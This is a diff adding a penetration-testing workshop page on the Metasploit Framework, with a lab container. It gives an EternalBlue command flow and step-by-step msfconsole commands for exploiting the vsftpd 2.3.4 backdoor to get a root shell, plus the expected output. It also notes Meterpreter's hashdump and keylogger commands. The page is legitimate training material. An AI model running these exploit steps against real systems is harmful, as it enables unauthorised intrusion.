@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VAPT Workshop - Metasploit Framework</title>
+    <link rel="stylesheet" href="../../styles/theme.css">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800;900&family=Fira+Code&display=swap" rel="stylesheet">
+</head>
+<body>
+<div class="app-container">
+    
+
+    <nav class="sidebar">
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 2.5rem;">
+            <span class="brand" style="margin-bottom: 0;">VAPT Workshop</span>
+            <button class="theme-toggle" id="themeToggle" onclick="toggleTheme()" title="Toggle Light/Dark Mode" style="position: static; padding: 0.5rem; border-radius: 50%; width: 40px; height: 40px; display: flex; justify-content: center; align-items: center;">
+                <span id="themeIcon" style="font-size: 1.2rem;">☀️</span>
+            </button>
+        </div>
+        <div class="nav-group">
+            <div class="nav-group-title">Table of Contents</div>
+            <ul class="nav-links">
+                <li><a href="../../index.html">Welcome & Intro</a></li>
+                <li><a href="../../modules/privilege-escalation/overview.html">Privilege Escalation</a></li>
+                <li><a href="../../modules/xss/overview.html">Cross-Site Scripting (XSS)</a></li>
+                <li><a href="../../modules/privesc-xss/overview.html">PrivEsc via XSS</a></li>
+                <li><a href="../../modules/metasploit/overview.html" class="active">Metasploit</a></li>
+                <li><a href="../../modules/exploitation/overview.html">Exploitation Frameworks</a></li>
+                <li><a href="../../modules/sqli/overview.html">SQL Injection</a></li>
+                <li><a href="../../modules/aitm/overview.html">AITM Attacks</a></li>
+                <li><a href="../../modules/password-attacks/overview.html">Password Attacks</a></li>
+                <li><a href="../../modules/network-pentesting/overview.html">Network Pentesting</a></li>
+                <li><a href="../../modules/wireless-pentesting/overview.html">Wireless Pentesting</a></li>
+                <li><a href="../../modules/social-engineering/overview.html">Social Engineering</a></li>
+                <li><a href="../../modules/security-controls/overview.html">Security Controls</a></li>
+                <li><a href="../../modules/physical-security/overview.html">Physical Security</a></li>
+                <li><a href="../../modules/reporting/overview.html">Reporting</a></li>
+            </ul>
+        </div>
+    </nav>
+    <main class="main-content" id="content-anchor">
+        <h1>Module: Metasploit Framework Deep Dive</h1>
+
+<div class="glass-card">
+  <h2>1. Core Architectural Concept 🧠</h2>
+  <p><strong>Metasploit Framework (MSF)</strong> is a ruby-based penetration testing platform that enables you to find, exploit, and validate vulnerabilities. Before Metasploit, hackers had to write custom scripts for every single buffer overflow they found.</p>
+  <p>Metasploit revolutionized hacking by standardizing it into three modular components:</p>
+  <ul>
+      <li><strong>Exploit:</strong> The delivery vehicle (the lockpick). e.g., Sending a malformed packet to a vulnerable SMB server.</li>
+      <li><strong>Payload:</strong> The cargo (what happens when the door opens). e.g., Opening a reverse shell back to the attacker.</li>
+      <li><strong>Auxiliary:</strong> Scanners and fuzzers that don't result in a shell (e.g., port scanners, vulnerability checks).</li>
+  </ul>
+</div>
+
+<div class="glass-card">
+  <h2>2. The Attack Flow (Meterpreter) 🎯</h2>
+  <div class="attack-flow">
+    <div class="flow-step">👨💻 Attacker <code>msfconsole</code></div>
+    <div class="flow-arrow">↓</div>
+    <div class="flow-step hacker-step">⚙️ <code>use exploit/windows/smb/ms17_010_eternalblue</code></div>
+    <div class="flow-arrow">↓</div>
+    <div class="flow-step target-step">📡 <code>set RHOSTS 10.0.0.5</code> (Target IP)</div>
+    <div class="flow-arrow">↓</div>
+    <div class="flow-step goal-step">🏁 <code>exploit</code> -> Meterpreter Session</div>
+  </div>
+  
+  <div class="callout tip">
+    <div class="icon">💡</div>
+    <div class="content"><strong>Meterpreter vs Standard Shell:</strong> A standard reverse shell is basic. Meterpreter is Metasploit's custom, advanced payload that lives entirely in memory (harder for AV to detect) and provides built-in commands like <code>hashdump</code>, <code>keyscan_start</code> (keylogger), and <code>screenshot</code>.</div>
+  </div>
+</div>
+
+<div class="glass-card">
+  <h2>3. Hands-on Lab: VSFTPD 2.3.4 Backdoor 🧪</h2>
+  
+  <div class="lab-header">
+    <h3 class="lab-title">🧪 Lab: Exploiting the Smiley Face Backdoor</h3>
+    <div class="lab-meta">
+      <span class="meta-badge">Topic: Framework Exploitation</span>
+      <span class="meta-badge difficulty-easy">Difficulty: Easy</span>
+      <span class="meta-badge">Time: 20 mins</span>
+    </div>
+
+    <div style="margin-top: 15px; display: flex; gap: 10px; flex-wrap: wrap;">
+      <button onclick="startLab('metasploit')" class="btn-start-lab">▶ Start Metasploit Lab</button>
+      <button onclick="stopLab('metasploit')" class="btn-stop-lab">🛑 Stop Metasploit Lab</button>
+    </div>
+    
+    <div id="console-metasploit" class="terminal-output" style="display: none; background: #0f172a; color: #10b981; font-family: monospace; padding: 15px; border-radius: 6px; margin-top: 15px; border: 1px solid #334155; max-height: 300px; overflow-y: auto; text-align: left;">
+        <span style="color: #64748b;">[System] Awaiting container initialization...</span>
+    </div>
+
+  </div>
+  
+  <div class="lab-content">
+    
+    <h4>Context & Architecture</h4>
+    <p>In 2011, the master repository for the popular FTP server `vsftpd` was compromised. The attacker added a malicious backdoor to version 2.3.4. If a user tried to login with a username containing a smiley face <code>:)</code>, the server would instantly open a secret root shell on port 6200.</p>
+    
+    <h4>Attack Steps (Run in your local Kali/Parrot Terminal)</h4>
+    <p>Assuming the vulnerable lab container started successfully, its FTP port `21` is mapped to your localhost `2121`. Follow these steps in `msfconsole` to gain a root shell.</p>
+
+<pre><code class="language-bash">$ msfconsole -q
+
+# 1. Search for the specific FTP exploit module
+msf6 > search vsftpd
+
+# 2. Select the module (usually index 0)
+msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
+
+# 3. View the options required by the exploit
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
+
+# 4. Set the Target IP (localhost since Docker maps it locally)
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 127.0.0.1
+
+# 5. Set the Target Port (Because Docker is mapping it to 2121)
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RPORT 2121
+
+# 6. Fire the Exploit
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
+</code></pre>
+
+    <h4>Expected Terminal Output</h4>
+    <div style="background: #1e1e1e; color: #d4d4d4; padding: 15px; font-family: monospace; border-radius: 5px; margin-bottom: 20px;">
+        <span style="color: #569cd6;">[*]</span> 127.0.0.1:2121 - Banner: 220 (vsFTPd 2.3.4)<br>
+        <span style="color: #569cd6;">[*]</span> 127.0.0.1:2121 - USER: 331 Please specify the password.<br>
+        <span style="color: #4ec9b0;">[+]</span> 127.0.0.1:2121 - Backdoor service has been spawned, handling...<br>
+        <span style="color: #4ec9b0;">[+]</span> 127.0.0.1:2121 - UID: uid=0(root) gid=0(root)<br>
+        <span style="color: #569cd6;">[*]</span> Found shell.<br>
+        <span style="color: #569cd6;">[*]</span> Command shell session 1 opened (127.0.0.1:51342 -> 127.0.0.1:6200)<br><br>
+        <strong>id</strong><br>
+        uid=0(root) gid=0(root) groups=0(root)
+    </div>
+    
+  </div>
+</div>
+
+    <div class="content-nav">
+        <div><a href="../../modules/privesc-xss/overview.html" class="content-nav-prev"><span>←</span> PrivEsc XSS</a></div>
+        <div><a href="../../modules/exploitation/overview.html" class="content-nav-next"><span>→</span> Exploitation</a></div>
+    </div>
+    
+</main>
+</div>
+
+<script>
+    let logIntervals = {};
+
+    async function startLab(labName) {
+        const consoleDiv = document.getElementById('console-' + labName);
+        consoleDiv.style.display = 'block';
+        consoleDiv.innerHTML = '<span style="color: #64748b;">[System] Sending Boot command for ' + labName + '...</span><br>';
+        
+        try {
+            let res = await fetch('/api/start?lab=' + labName);
+            let data = await res.json();
+            if (data.status === 'error' || !res.ok) {
+                consoleDiv.innerHTML += '<span style="color: #ef4444;">[System Error] ' + (data.message || 'Failed to start lab') + '</span><br>';
+                return;
+            }
+            consoleDiv.innerHTML += '<span style="color: #3b82f6;">[System] ' + data.message + '</span><br>';
+            
+            if (logIntervals[labName]) clearInterval(logIntervals[labName]);
+            logIntervals[labName] = setInterval(() => pollLogs(labName), 2000);
+        } catch (e) {
+            consoleDiv.innerHTML += '<span style="color: #ef4444;">[System Error] ' + e + '</span><br>';
+        }
+    }
+
+    async function stopLab(labName) {
+        const consoleDiv = document.getElementById('console-' + labName);
+        consoleDiv.style.display = 'block';
+        consoleDiv.innerHTML += '<span style="color: #ef4444;">[System] Halting ' + labName + ' container...</span><br>';
+        
+        if (logIntervals[labName]) {
+            clearInterval(logIntervals[labName]);
+            delete logIntervals[labName];
+        }
+
+        try {
+            let res = await fetch('/api/stop?lab=' + labName);
+            let data = await res.json();
+            consoleDiv.innerHTML += '<span style="color: #64748b;">[System] ' + data.message + '</span><br>';
+        } catch (e) {
+            consoleDiv.innerHTML += '<span style="color: #ef4444;">[System Error] ' + e + '</span><br>';
+        }
+    }
+
+    async function pollLogs(labName) {
+        try {
+            let res = await fetch('/api/logs?lab=' + labName);
+            let data = await res.json();
+            const consoleDiv = document.getElementById('console-' + labName);
+            
+            if (data.status === 'success') {
+                let safeLogs = data.logs.replace(/</g, "&lt;").replace(/>/g, "&gt;");
+                safeLogs = safeLogs.replace(/\n/g, "<br>");
+                const sysHeader = '<span style="color: #3b82f6;">[System] Streaming container logs...</span><br><br>';
+                consoleDiv.innerHTML = sysHeader + safeLogs;
+                consoleDiv.scrollTop = consoleDiv.scrollHeight;
+            }
+        } catch (e) {
+            console.error("Log poll failed", e);
+        }
+    }
+</script>
+
+<script>
+    // Theme toggling logic
+    function setTheme(isLight) {
+        if (isLight) {
+            document.documentElement.classList.add('light-theme');
+            document.getElementById('themeIcon').innerText = '🌙';
+            
+            localStorage.setItem('vapt-theme', 'light');
+        } else {
+            document.documentElement.classList.remove('light-theme');
+            document.getElementById('themeIcon').innerText = '☀️';
+            
+            localStorage.setItem('vapt-theme', 'dark');
+        }
+    }
+
+    function toggleTheme() {
+        const isLight = !document.documentElement.classList.contains('light-theme');
+        setTheme(isLight);
+    }
+
+    // Initialize theme based on localStorage
+    const savedTheme = localStorage.getItem('vapt-theme');
+    if (savedTheme === 'light') {
+        setTheme(true);
+    }
+</script>
+
+</body>
+</html>
